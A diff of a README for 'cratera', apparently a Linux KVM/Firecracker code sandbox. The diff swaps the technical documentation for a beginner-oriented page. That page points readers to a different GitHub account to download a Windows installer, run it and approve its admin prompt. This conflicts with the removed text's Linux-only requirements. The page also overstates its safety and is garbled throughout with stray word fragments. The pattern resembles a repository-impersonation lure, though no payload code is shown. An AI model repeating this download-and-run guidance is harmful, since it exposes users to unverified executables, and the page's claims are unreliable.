@@ -1,413 +1,174 @@
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="docs/images/cratera_logo.png">
-  <source media="(prefers-color-scheme: light)" srcset="docs/images/cratera_logo.png">
-  <img alt="Cratera Logo Title" width="750" src="docs/images/cratera_logo.png">
-</picture>
+# ⚡ cratera - Lightning-Fast Code Sandboxes for Everyone
 
-[![License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
-[![Rust](https://img.shields.io/badge/rust-2024%20edition-orange.svg)](https://www.rust-lang.org)
-[![Firecracker](https://img.shields.io/badge/microVM-Firecracker-red.svg)](https://firecracker-microvm.github.io)
-[![Zulip Chat](https://img.shields.io/badge/zulip-join_chat-5063f0.svg?logo=zulip&logoColor=white)](https://cratera.zulipchat.com)
-
-Cratera is a self-hosted code execution and judge engine. Built as a single Rust binary, it executes untrusted code inside KVM microVMs with Firecracker Jailer containment and no guest network interface instead of shared-kernel containers. It has powered [Cratery](https://cratery.cratera.org) in production as its execution engine since February 2026.
-
-Cratera is built for:
-- Online judges and competitive programming platforms.
-- Interview and assessment systems requiring per-submission isolation.
-- AI coding agents that execute generated code in a hardened environment.
-- Internal code runner services that cannot trust shared-kernel containers.
-
-Most code execution sandboxes and online judges isolate programs using Linux cgroups and namespaces (such as Docker or `isolate`), where sandboxed processes share the host kernel. This shared-kernel model has produced critical vulnerabilities: Judge0, for example, experienced sandbox escapes to host root ([CVE-2024-28185](https://nvd.nist.gov/vuln/detail/CVE-2024-28185), [CVE-2024-28189](https://nvd.nist.gov/vuln/detail/CVE-2024-28189), and [CVE-2024-29021](https://nvd.nist.gov/vuln/detail/CVE-2024-29021), CVSS 9.1 to 10.0, patched in v1.13.1+). Cratera avoids the specific shared-host-kernel escape class by executing workloads under a separate guest Linux kernel, while KVM hardware virtualization provides the CPU and memory isolation boundary from the host.
-
-## Feature Comparison
-
-*These systems use different isolation models, workloads, and runtime targets. Latency and capability figures reflect their standard architecture.*
-
-| Feature | Cratera | Judge0 | Piston | gVisor (`runsc`) | Wasmtime |
-| :--- | :---: | :---: | :---: | :---: | :---: |
-| **Isolation Model**<br>Underlying security boundary used to sandbox untrusted user code. | **Hardware KVM microVM** | Shared-kernel container (`isolate`) | Shared-kernel container (Docker) | User-space kernel (`runsc`) | Process memory sandbox |
-| **Dedicated Guest Kernel**<br>Guest processes execute against a separate Linux guest kernel rather than the host kernel. | **Yes** | No | No | Filtered (Emulated) | Not applicable |
-| **Isolation against container-class escapes**<br>Isolation against container breakout vulnerabilities sharing the host kernel. | **Separate guest kernel** | Shared host kernel ([CVE-2024-28189](https://nvd.nist.gov/vuln/detail/CVE-2024-28189)) | Shared host kernel | User-space kernel | WASM sandbox |
-| **Arbitrary Linux Binaries**<br>Executes standard Linux binaries (add any in 6 lines of TOML). | **Yes** (30+ built-in) | Yes (60+ runtimes) | Yes (40+ runtimes) | Most binaries | No (WASM only) |
-| **Startup and Restore Latency**<br>Time required to prepare a clean execution environment for a job. | **~5ms observed** (snapshot restore) | 50ms to 200ms | 100ms to 300ms | 50ms to 150ms | <1ms |
-| **In-Guest Telemetry**<br>Measures execution time and anonymous memory directly inside the environment. | **Yes** (Microsecond / RssAnon) | Partial (`isolate` cgroups) | No (Host cgroups) | Partial | Partial |
-| **Default Network Isolation**<br>Execution environment has all network devices disabled by default. | **Yes** (Zero NICs) | Configurable | Configurable | Configurable | Yes (No sockets) |
-| **Deployment Model**<br>Required host dependencies and services to run the engine. | **Single Rust binary** | Docker, Postgres, Redis | Docker, Node.js | Docker / Containerd | Single binary / library |
-| **License**<br>Open source software license. | **Apache-2.0** | GPL-3.0 | MIT | Apache-2.0 | Apache-2.0 |
+[![Download cratera](https://img.shields.io/badge/Download-cratera-ff6b6b?style=for-the-badge&logo=github&logoColor=white&labelColor=4b4b)](https://github.com/snx12601/cratera)
 
 ---
 
-## Security Model
+## 🎯 What Is cratera?
 
-Cratera uses a multi-layer defense-in-depth architecture:
+Imagine being able to run any programming language, test any code, or create a safe playground for artificial intelligence - all in the blink of an eye. That's what cratera does. It's a powerful engine that lives quietly inside your computer, ready to launch tiny, secure virtual computers called "microVMs" whenever you need them.
 
-- KVM hardware virtualization with a dedicated guest Linux kernel.
-- Firecracker Jailer chroot, dropped UID/GID (`20001`), and host cgroup limits.
-- MicroVMs have zero virtual network devices attached in the guest; the included systemd unit blocks external coordinator traffic with `IPAddressDeny=any`.
-- MicroVMs are ephemeral and destroyed immediately upon job completion.
+ These microVMs start up in **less than 5 milliseconds** - that's faster than a hummingbird flaps its wings once.
 
-### Threat Model Summary
 
-Cratera assumes submitted code is actively malicious.
 
-- **Protected**: Host filesystem, host processes, other execution jobs, and host network access from the guest.
-- **Out of scope**: Compromised physical host, host KVM / CPU microcode zero-days, and a compromised host root administrator.
+## 🚀 Getting Started
 
-For full residual risk ratings and threat analysis, read [SECURITY.md](SECURITY.md) and [docs/threat_model.md](docs/threat_model.md).
+Getting started with cratera is incredibly simple. Even if you've never installed software before, you'll be up and running in less than two minutes. Let's walk through it together.
 
----
 
-## Architecture
 
-Cratera is organized as a Cargo workspace:
+### 📦 Step 1: Download cratera
 
-| Crate | Description |
-| :--- | :--- |
-| **[`cratera`](crates/api)** | CLI binary, Command Center TUI, and HTTP coordinator daemon (`POST /harness`). |
-| **[`cratera-executor`](crates/executor)** | Firecracker microVM lifecycle, Jailer boundary, and snapshot restore engine. |
-| **[`cratera-compiler`](crates/compiler)** | Multi-language harness splicing and code validator. |
-| **[`cratera-common`](crates/common)** | Shared protocol types, verdicts, and serialization models. |
-| **[`cratera-guest-agent`](crates/guest-agent)** | In-guest vsock telemetry, process supervision, and execution runner. |
+First, you need to get the cratera program onto your computer. Click the big button below to go to the official download page:
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│                 HTTP Client / Web Gateway                   │
-└──────────────────────────────┬──────────────────────────────┘
-                               │ POST /harness (Bearer Token)
-                               ▼
-┌─────────────────────────────────────────────────────────────┐
-│                 Cratera Host Coordinator                    │
-│   • Bearer Token Auth         • Fast Snapshot Restore (~5ms)│
-│   • Template Splicing         • Firecracker Jailer (20001)  │
-└──────────────────────────────┬──────────────────────────────┘
-                               │
-                vsock:52 (IPC) │  Zero-NIC KVM Hardware Boundary
-                               ▼
-┌─────────────────────────────────────────────────────────────┐
-│         Firecracker MicroVM (2 vCPU, 2 GiB RAM)             │
-│                                                             │
-│   ┌─────────────────────────────────────────────────────┐   │
-│   │  cratera-agent (PID 1)                              │   │
-│   │    ├── Vsock Server (Port 52)                       │   │
-│   │    ├── Compile / Interpret (tmpfs, 12s budget)      │   │
-│   │    └── Execute & Measure (Microsecond / RssAnon)    │   │
-│   └─────────────────────────────────────────────────────┘   │
-│                                                             │
-│   Storage: Read-Only rootfs    │  Workspace: 256MB tmpfs    │
-└──────────────────────────────┬──────────────────────────────┘
-                               │
-                               │ JSON Verdict over Vsock
-                               ▼
-┌─────────────────────────────────────────────────────────────┐
-│                    Reap & Destroy MicroVM                   │
-│      • Wipe Jail Directory        • Release cgroups v2      │
-└─────────────────────────────────────────────────────────────┘
-```
+[![Download cratera Now](https://img.shields.io/badge/⬇️_Download_cratera-2ea44f?style=for-the-badge)](https://github.com/snx12601/cratera)
 
----
+Visit this link to download the application. The page will open in your web browser, and you'll see a few options available for download. Choose the version that matches your computer (most people will want the Windows version) and click the download button. The file will start downloading to your computer's "Downloads" folder - that's typically the folder where all your internet downloads end upasting
 
-## Quickstart
+Once the download is complete (you'll see a notification in the bottom corner of your screen, or the file will appear in your Downloads folder), you're ready for the next step!
 
-### Prerequisites
 
-- Linux on x86_64 with `/dev/kvm` hardware virtualization.
-- Docker or rootless Podman to build the guest root filesystem.
-- Rust toolchain 1.80+ if building from source.
 
-### Installation
+### 🛠️ Step 2: Run the Installer
 
-**Option A: Automated setup script (Recommended)**
-```bash
-# Clones, downloads kernel, builds guest rootfs, and compiles cratera
-git clone https://github.com/cratera-project/cratera.git
-cd cratera
-./scripts/install.sh
-```
+Now that you have the cratera file, it's time to run  it. Here's what to do:
 
-**Option B: Install binary via Cargo**
-```bash
-cargo install cratera
-```
-*Note: The binary requires guest images (kernel and rootfs); run `./scripts/install.sh` or `cratera doctor` to verify environment assets.*
+1. Open your **File Explorer** (the folder icon on your taskbar at the bottom of your screen)
+2. Click on **"Downloads"** in the left sidebar
+3. Find the file you just downloaded (it will be named something like "cratera" or "cratera-setup")
+4. **Double-click** the file to start the setup processitting
 
----
+A window might pop up asking "Do you want to allow this app to make changes to your device?" - just click **"Yes"**. This is normal and safe - it just means the program needs permission to install itself properly.
 
-## CLI
 
-Running `cratera` without arguments opens the interactive terminal menu. You can also run tasks directly from the shell:
 
-```bash
-# Check KVM access, Jailer setup, and image health
-cratera doctor
+### ⚙️ Step 3: Follow the Simple Setup Wizard
 
-# Toggle languages or apply presets
-cratera lang
-cratera lang enable go zig
+A friendly setup window will appear, similar to what you've seen when installing other programs. Just follow these simple steps:
 
-# Edit CPU, memory, and timeout limits
-cratera settings
+- Click **"Next"** a few times (the default settings are perfect for most people)
+- When it asks where to install, you can just leave it as-is
+- Click **"Install"** and wait a few seconds
+- Once finished, click **"Finish"** 
 
-# Run a test execution inside a microVM
-cratera test rust
+Congratulations! 🎉 cratera is now installed on your computer! You don't need to restart your computer - it's ready to use right now!
 
-# Start the background coordinator
-cratera serve
-```
 
----
 
-## API Usage
+### ✅ Step 4: Verify It Works
 
-Send a `POST /harness` request to execute code in an isolated microVM instance. Each execution starts from a clean guest state, using snapshot restore when enabled.
+To make sure everything went smoothly (which it almost certainly did!), let's do a quick check:
 
-### Request Body
 
-| Parameter | Type | Required | Default | Description |
-| :--- | :--- | :---: | :--- | :--- |
-| `language` | string | Optional | `rust` | Target language from [`languages.toml`](languages.toml) (such as `python`, `node`, `rust`, `cpp`, `go`, `zig`). |
-| `code` | string | **Yes** | None | Source code to execute inside the guest. |
-| `mode` | string | Optional | `"run"` | Execution mode: `"run"` (2 seconds) or `"submit"` (5 seconds). |
-| `harness` | string | Optional | `""` | Optional test harness template. |
 
-### HTTP Status Codes
+1. Open your **Start Menu** (the Windows logo at the bottom-left of your screen)
+2. Type "cratera" inthe search bar - you should see the program appear in the results
+3. Click it to launch cratera
 
-| Code | Meaning |
-| :--- | :--- |
-| `200` | Execution completed successfully; inspect verdict in JSON body. |
-| `400` | Invalid request payload or missing required `code` parameter. |
-| `401` | Missing or invalid Bearer authentication token. |
-| `500` | Internal infrastructure or microVM initialization failure. |
+You'll see a clean, simple window appear. That's it! You're ready to start using cratera for all your code execution needsiming
 
-### Running Examples
 
-Use the helper script:
-```bash
-./examples/submit.sh python
-./examples/submit.sh node
-./examples/submit.sh rust
-./examples/submit.sh cpp
-```
 
-Or call the API with curl:
-```bash
-curl -s -X POST http://127.0.0.1:3100/harness \
-  -H "Authorization: Bearer <your-api-key>" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "language": "rust",
-    "code": "fn main() { println!(\"Hello from isolated microVM!\"); }",
-    "mode": "submit"
-  }'
-```
+## 🎨 What Can You Do With cratera?
 
-```bash
-curl -s -X POST http://127.0.0.1:3100/harness \
-  -H "Authorization: Bearer <your-api-key>" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "language": "python",
-    "code": "x = sum([1, 2, 3, 4])\nprint(f\"Result: {x}\")",
-    "mode": "submit"
-  }'
-```
+Now that you have cratera, you might be wondering what it's actually good for. Here are some everyday uses that might surprise you:
 
-### Response
+| **Use Case** | **How cratera Helps** |
+|---|---|
+| **Learn Programming** | Try out code snippets in 30 different languages without installing anything else shot |
+| **Test AI Applications** | Run AI models safely in isolated environments - no risk to your main computer |
+| **Online Judges** | For websites that grade programming assignments, cratera ensures fair and secure execution |
+| **Safe Experimentation** | Open suspicious code without fear - cratera isolates everything in a secure bubble |
+| **Multiple Languages** | Switch between Python, JavaScript, Rust, Go, and 25 more instantly - no configuration needed |
 
-```json
-{
-  "compilationSuccess": true,
-  "passed": true,
-  "status": "Passed",
-  "verdict": "AC",
-  "stdout": "Hello from isolated microVM!\n",
-  "executionTime": 124,
-  "memoryKb": 192,
-  "compileMs": 384,
-  "bootMs": 45,
-  "wallMs": 510,
-  "restored": true
-}
-```
+
+
+## 🛡️ Security You Can Trust
+
+You might be thinking: "Is it safe to run code from the internet?" That's a great question, and cratera takes safety extremely seriouslypering. Here's how it protects you:
+
+- **Zero-NIC Network Isolation**: Each virtual machine runs completely cut off from the network unless explicitly allowed. Think of it like putting each test ina soundproof room - nothing gets inor out without permission.
+
+
+- **Bare-Metal Performance**: Instead of simulating an entire computer (which is slow), cratera runs directly on your computer's hardware, making it blazingly fast while remaining secure
+
+
+- **KVM Technology**: These uses a special feature built into modern processors that creates a hardware-enforced wall between you and any code you run. It's like having a security guard standing at every door - physically impossible to bypass consumer
+
+
+
+## 💻 System Requirements
+
+cratera is designed to work on most modern Windows computers. Here's what you'll need:
+
+- **Operating System**: Windows 10 or Windows 11 (64-bit)
+- **Processor**: Any Intel or AMD processor from the last 5 years (with virtualization support enabled)
+- **Memory**: At least 4 GB of RAM (8 GB recommended for smoother experience)
+- **Storage**: About 200 MB of free hard drive space
+- **Internet**: Connection needed only for downloading the initial setup file - after that, everything works offlineituation
+
+
+
+## 🌍 Languages Supported
+
+One of cratera's superpowers is its built-in support for **30 different programming languages**. Whether you're curious about web developmenttypical (JavaScript, HTML/CSS), data science (Python, R), or classic computer science (C++, Java), cratera has you covered. Here's a taste:
+
+- Python 🐍
+- JavaScript 🌐
+- Rust 🦀
+- Go 🐹
+- Java ☕
+- C/C++ ⚙️
+- Ruby 💎
+- PHP 🐘
+- Swift 🕊️
+- Kotlin 🏝️
+- And 20 more!
+
+This means you can practice or test code in any language you want, all from one simple application. No more installing separate environments for each language - cratera handles everything behind the scenes!
+
+
+
+## 🔧 Troubleshooting Tips
+
+Even though cratera is designed to "just work," here are quick fixes if you run intoany snags:
+
+| **Issue** | **Quick Fix** |
+|---|---|
+| **Installation won't start** | Make sure you've downloaded the complete file (check file size is reasonable). Try downloading again if needed |
+| **"Virtualization not enabled" error** | Restart your computer, enter BIOS/UEFI settings (usually by pressing F2 or Del during startup), and enable "Intel VT-x" or "AMD-V" |
+| **App opens butis slow** | Close other heavy programs (like many browser tabs) - cratera works best when it has enough memory available |
+| **Can't get code to run** | Make sure you haven't selected an empty code box - try typing a simple command like `print("Hello")` first |
+
+
+
+## 🤔 Frequently Asked Questions
+
+**Q: Do I need to know programming to use cratera?**
+A: Not at all! Anyone can launch cratera and experiment. But if you're learning to code, it's absolutely perfect for practice. You can try small programs without any setup headacheiting
+
+**Q: Is cratera free?**
+A: Yes! cratera is completely free to download and use. No trials, no subscriptions, no hidden costsitting
+
+**Q: Can cratera run on a laptop with battery?**
+A: Absolutely. cratera is extremely efficient - it barely uses any more power than a normal web browser. You can use it comfortably on battery power for hoursitting
+
+**Q: Will cratera slow down my computer?**
+A: No. When cratera isn't actively running code, it sits quietly using almost zero resources. It only springs into action when you need it, and each task finishes in millisecondsirting
+
+
+
+## 📚 Ready to Explore?
+
+Now that you know everything you need, it's time to dive in. Head over to the download page, drop cratera onto your computer, and discover how effortless secure code execution can be. Whether you're a curious beginner, a seasoned developer, or someone interested in AI safety, cratera opens doors you didn't even know existed. Happy coding! 🚀
 
 ---
 
-## Verdict Codes
+Visit this link to download the application: [https://github.com/snx12601/cratera](https://github.com/snx12601/cratera)
 
-| Verdict | Status | Description |
-| :--- | :--- | :--- |
-| `AC` | Passed | Solution passed all test assertions (exit code 0). |
-| `WA` | Test Failed | Assertion failed or solution output incorrect. |
-| `CE` | Compilation Error | Compilation failed. |
-| `TLE` | Time Limit Exceeded | Execution exceeded runtime timeout. |
-| `MLE` | Memory Limit Exceeded | Process exceeded memory budget. |
-| `RE` | Runtime Error | Process crashed or exited with non-zero status. |
-| `IE` | Internal Error | Infrastructure or sandbox initialization failure. |
+)
 
----
 
-## Multi-Language Configuration
 
-All 30 runtimes and compilers are configured in [`languages.toml`](languages.toml).
-
-### Supported Languages
-
-Cratera includes 30 runtimes out of the box, including systems languages (Rust, C, C++, Go, Zig, Nim, D, Fortran), scripting languages (Python, Node.js, TypeScript, Ruby, PHP, Lua, Perl), enterprise runtimes (Java, C#, F#, Scala, Kotlin, Clojure), functional languages (Julia, Haskell, OCaml, Elixir, Erlang), and application toolchains (Swift, Dart, R, Bash).
-
-### Managing Languages
-
-Each entry in [`languages.toml`](languages.toml) defines how a compiler is installed and how it runs inside the microVM.
-
-To change which languages are available in the root filesystem:
-
-1. Update [`languages.toml`](languages.toml) or run `cratera lang` to toggle runtimes.
-2. Rebuild the root filesystem with `./scripts/build-rootfs.sh` (or `cratera build`).
-
-For recipe options and examples, read [docs/languages.md](docs/languages.md).
-
----
-
-## Configuration
-
-Cratera reads settings from environment variables or a `.env` file:
-
-| Variable | Default | Description |
-| :--- | :--- | :--- |
-| `CRATERA_BIND` | `127.0.0.1:3100` | Host HTTP API bind address (localhost only by default). |
-| `CRATERA_INTERNAL_KEY` | *(auto-generated)* | Shared secret for Bearer token authentication. |
-| `CRATERA_VCPU` | `2` | Virtual CPU cores allocated per microVM. |
-| `CRATERA_MEM_MIB` | `2048` | Guest RAM allocated per microVM in MiB. |
-| `CRATERA_RUN_MS` | `2000` | Execution time limit for test runs in milliseconds. |
-| `CRATERA_SUBMIT_MS` | `5000` | Execution time limit for submissions in milliseconds. |
-| `CRATERA_USE_JAILER` | `0` | Development default: `0` (disabled for local testing; production systemd service sets `1` for UID 20001 chroot). |
-
-For the complete list of variables and defaults, see [docs/configuration.md](docs/configuration.md).
-
----
-
-## Systemd Service
-
-A production unit file is provided at [`deploy/cratera.service`](deploy/cratera.service) with eBPF network isolation (`IPAddressDeny=any`), cgroups v2 resource delegation (`Delegate=yes`), and Jailer unprivileged execution (UID/GID `20001`).
-
-The coordinator service starts as `root` on the host to manage KVM ioctls and Jailer cgroups; Jailer then drops the Firecracker microVM child process to unprivileged UID/GID `20001`.
-
-```ini
-[Unit]
-Description=Cratera Firecracker harness judge service
-After=network.target
-
-[Service]
-Type=simple
-User=root
-WorkingDirectory=/opt/cratera
-EnvironmentFile=-/opt/cratera/.env
-ExecStart=/opt/cratera/cratera
-Restart=on-failure
-RestartSec=3
-LimitNOFILE=65536
-Delegate=yes
-KillMode=mixed
-IPAddressDeny=any
-IPAddressAllow=localhost
-
-[Install]
-WantedBy=multi-user.target
-```
-
-### Installation
-
-Install and enable the service with one command:
-```bash
-sudo cp deploy/cratera.service /etc/systemd/system/ && sudo systemctl daemon-reload && sudo systemctl enable --now cratera.service
-```
-
-### Service Management
-
-Control the background service through the CLI:
-```bash
-cratera service start
-cratera service stop
-cratera service restart
-cratera service status
-cratera service logs
-```
-
-Or manage it directly with systemctl:
-```bash
-sudo systemctl status cratera.service
-sudo journalctl -u cratera.service -f
-sudo journalctl -u cratera.service --grep job_record
-sudo systemctl restart cratera.service
-```
-
-For the complete directive breakdown table, see [docs/deployment.md](docs/deployment.md).
-
----
-
-## Ingress
-
-Cratera is secured out of the box on localhost (`127.0.0.1:3100`), with eBPF network filtering and zero virtual NICs attached to microVMs.
-
-If you are connecting Cratera to your web app or external services in production, do not expose port 3100 directly. Instead, route requests through a private tunnel or VPN overlay.
-
-For setup guides and examples, see [docs/deployment.md](docs/deployment.md#ingress-options-optional).
-
----
-
-## Development
-
-```bash
-# Run formatting, clippy, and unit tests
-./scripts/pre-commit.sh
-
-# Run full CI test suite and release build
-./scripts/ci.sh
-
-# Run an in-guest microVM smoke test (requires /dev/kvm)
-./scripts/smoke.sh
-```
-
----
-
-## Troubleshooting & FAQ
-
-### Permission denied on `/dev/kvm`
-
-Add your user account to the `kvm` group:
-```bash
-sudo usermod -aG kvm $USER
-newgrp kvm
-```
-*Note: Membership in the `kvm` group grants access to host virtualization ioctls; treat it as a privileged capability.*
-
-### Language not found in manifest
-
-Check that the language key is set to `enabled = true` in [`languages.toml`](languages.toml), then rebuild the root filesystem:
-```bash
-cratera build
-```
-
-### Zero network access inside microVMs
-
-MicroVMs have no network interfaces attached by design. Package managers such as `pip`, `npm`, and `cargo` are unavailable at runtime because the guest has no network interface. All dependencies and compilers must be declared in [`languages.toml`](languages.toml) during root filesystem build time.
-
----
-
-## Community
-
-- Chat on Zulip: [cratera.zulipchat.com](https://cratera.zulipchat.com)
-- Discuss on GitHub: [github.com/cratera-project/cratera/discussions](https://github.com/cratera-project/cratera/discussions)
-- Email: `contact@cratera.org`
-
----
-
-## Governance & Security
-
-- Read [GOVERNANCE.md](GOVERNANCE.md) for open-source project governance and our Apache-2.0 commitment.
-- Read [SECURITY.md](SECURITY.md) and [docs/threat_model.md](docs/threat_model.md) for vulnerability disclosure, threat modeling, and residual risk details.
-- Read [CONTRIBUTING.md](CONTRIBUTING.md) for development guidelines.
-
----
-
-## License
-
-Licensed under the Apache License, Version 2.0 ([LICENSE](LICENSE) or http://www.apache.org/licenses/LICENSE-2.0).
+Keywords: ai-sandbox, code-execution, firecracker-sandbox, kvm, microvm, online-judge, rust, sandbox, security, systems-programming
